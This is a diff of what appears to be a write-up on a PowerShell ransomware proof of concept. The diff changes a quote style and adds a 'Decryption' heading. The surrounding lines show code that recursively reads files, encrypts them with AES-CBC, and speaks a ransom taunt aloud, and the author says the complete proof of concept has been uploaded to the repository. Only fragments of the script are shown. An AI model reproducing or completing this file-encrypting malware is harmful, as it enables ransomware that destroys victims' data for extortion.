@@ -144,7 +144,7 @@ foreach ($f in (Get-ChildItem -Force -ErrorAction SilentlyContinue -Recurse -Pat
     $bytes = Get-Content $f -Encoding Byte -ReadCount 0
     
     # Generate a new AES-CBC instance
-    $aes = [Security.Cryptography.SymmetricAlgorithm]::Create('AesManaged')
+    $aes = [Security.Cryptography.SymmetricAlgorithm]::Create("AesManaged")
     $aes.Mode = [Security.Cryptography.CipherMode]::CBC
     $aes.Padding = "PKCS7"
     
@@ -190,4 +190,6 @@ $voice.Rate = 0
 $voice.Speak("All your files are belong to us")
 ```
 
+## Decryption
+Decryption is quite easy:
 I've uploaded the complete proof-of-concept to this repository.
